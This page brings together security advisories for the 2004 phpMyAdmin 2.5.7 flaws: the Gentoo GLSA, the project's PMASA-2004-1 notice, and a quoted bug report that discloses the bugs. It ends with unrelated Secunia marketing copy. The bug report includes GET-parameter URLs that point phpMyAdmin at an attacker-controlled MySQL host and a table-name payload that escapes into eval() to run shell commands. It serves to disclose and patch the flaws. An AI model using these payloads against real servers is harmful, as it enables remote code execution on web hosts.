# phpMyAdmin: Multiple vulnerabilities — GLSA **200407-22**

Multiple vulnerabilities in phpMyAdmin may allow a remote attacker with a
valid user account to alter configuration variables and execute arbitrary
PHP code.

### Affected packages

| Package | **dev-db/phpmyadmin** on all architectures |
| --- | --- |
| Affected versions | <= **2.5.7** |
| Unaffected versions | >= **2.5.7\_p1** |

### Background

phpMyAdmin is a popular, web-based MySQL administration tool written in
PHP. It allows users to administer a MySQL database from a web-browser.

### Description

Two serious vulnerabilities exist in phpMyAdmin. The first allows any
user to alter the server configuration variables (including host, name,
and password) by appending new settings to the array variables that
hold the configuration in a GET statement. The second allows users to
include arbitrary PHP code to be executed within an eval() statement in
table name configuration settings. This second vulnerability is only
exploitable if $cfg['LeftFrameLight'] is set to FALSE.

### Impact

Authenticated users can alter configuration variables for their running
copy of phpMyAdmin. The impact of this should be minimal. However, the
second vulnerability would allow an authenticated user to execute
arbitrary PHP code with the permissions of the webserver, potentially
allowing a serious Denial of Service or further remote compromise.

### Workaround

The second, more serious vulnerability is only exploitable if
$cfg['LeftFrameLight'] is set to FALSE. In the default Gentoo
installation, this is set to TRUE. There is no known workaround for the
first.

### Resolution

All phpMyAdmin users should upgrade to the latest version:

```
 # emerge sync

 # emerge -pv ">=dev-db/phpmyadmin-2.5.7_p1"
 # emerge ">=dev-db/phpmyadmin-2.5.7_p1"
```

## PMASA-2004-1

**Announcement-ID:** PMASA-2004-1

**Date:** 2004-06-29

### Summary

When faking table with specific name, an attacker can make phpMyAdmin
to execute arbitrary php code and add custom server configuration.

### Description

phpMyAdmin used eval function to fill some values and one parameter
used there was table name. When specifying specially formatted table
name, this could lead to eval attacker code. However this requires also
a modified MySQL server, that will return these table names, as normally
MySQL doesn't allow it. With conjunction to not checking input variables,
attacker can make phpMyAdmin use patched MySQL server he wants.

### Severity

Default configuration is not affected by this issue, it can happen only
when $$cfg['LeftFrameLight'] is FALSE. When this condition is met,
attacker can execute arbitrary php code which is shipped by his patched
MySQL version. If php is running in safe mode or there is firewall not
allowing outgoing connections to outside machines, this issue can not
cause any harm. As this can cause serious problems, we consider this
issue as critical.

### Affected Versions

All releases starting with 2.5.1 up to and including 2.5.7.

### Unaffected Versions

All releases older than 2.5.1.
CVS HEAD has been fixed.
The upcoming 2.5.7-pl1 release.

### Solution

If you are vulnerable to this issue, we recommend to enable light left
frame mode, which disables eval code. We strongly advise everyone to
upgrade to CVS HEAD or to the next version of phpMyAdmin, which is to be
released soon.

| [Description](#c0)  Martin Holzer (RETIRED)   gentoo-dev  2004-07-21 12:59:29 UTC  ``` Software           : phpMyAdmin  Version         : 2.5.7  Vulnerability     : php codes injection  Problem-Type   : remote user  phpMyAdmin is web-based mysql administration written  in PHP.    There is a vulnerability in phpMyAdmin version 2.5.7.  This vulnerability would allow remote user to inject   php codes  to be executed by eval() function (in file left.php).  However, This vulnerability only effect if variable  $cfg['LeftFrameLight']  set to    FALSE (in file config.inc.php)    1. Bugs    The Bugs are  phpMyAdmin  do not prevent any user  from    1.a. Ability to grow up array variables by way of GET  params    PhpMyAdmin has multiple servers configuration stored  in array variables ($cfg['Servers'][$i]). They  are  coded in file  config.inc.php.  They are  usually set at instalation time by owner.  Each configuration contains mysql server information  to be used  by phpMyAdmin  as host, port, user, password,  authentication type, database  name etc of mysql server.  Up to three servers configuration is provided by  default.    However, Uninitialized $cfg['Servers'][$i]  allows  remote user to add server  configuration to the list of servers configuration by  growing up  $cfg['Servers'][$i] array through GET  parameters.    Remote user could add server configuration like this  <http://target/phpMyAdmin-2.5.7/left.php?server=4&cfg[Servers>] [4]  [host]=202.81.x.x&cfg[Servers][4] [port]=8888&cfg[Servers][4][user]=alice ..  and so forth.  The running script will use the fourth server  configuration which remote user  supply.    1.b. Escape 'magic' quote (') oops    if variable $cfg['LeftFrameLight'] set to FALSE, this  part of codes is  executed.    $eval_string = '$tablestack[\'' . implode('\'][\'',  $_table) . '\']  [\'pma_name\'][] = \'' . str_replace('\'', '\\\'',  $table) . '\';';  eval($eval_string);    $eval_string  will be php codes that executed by  function eval().  if we have one table  named 'mytable', $eval_string  will have  string value  $tablestack['']['pma_name'][] = 'mytable';    phpMyAdmin is improper to handle escaping single  quote.  So that  with crafted table name with its name  contains meta-chars like this                   \';exec(\"touch /tmp/touchable\");/*  $eval_string will  have  value  $tablestack['']['pma_name'][] =  '\\';exec("touch /tmp/touchable");/*';    In php language, It will interpret the string as   three  php statements. The  second statement will be  our exploite codes. The  last statement without  trailing comment just give a  warning  message in  php.    2. Exploite    Since mysql does not allow table name contain  meta-chars, we have to provide   a wrapper of mysql server. The wrapper acts like a  proxy except that it will   sends a fake table name, when client request a "SHOW  TABLES" query, by   replacing the real table name with a string contains  exploite codes.    <http://target/phpMyAdmin-2.5.7/left.php?server=4&cfg[Servers>] [4]  [host]=attacker.host.com&cfg[Servers][4] [port]=8889&cfg[Servers][4]  [auth_type]=config&cfg[Servers][4] [user]=user&cfg[Servers][4]  [password]=pass&cfg[Servers][4] [connect_type]=tcp&&cfg[Servers][4]  [only_db]=databasename    In attacker.host.com  mysql wrapper will listen  in  port 8889 waiting for  connection.    3.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
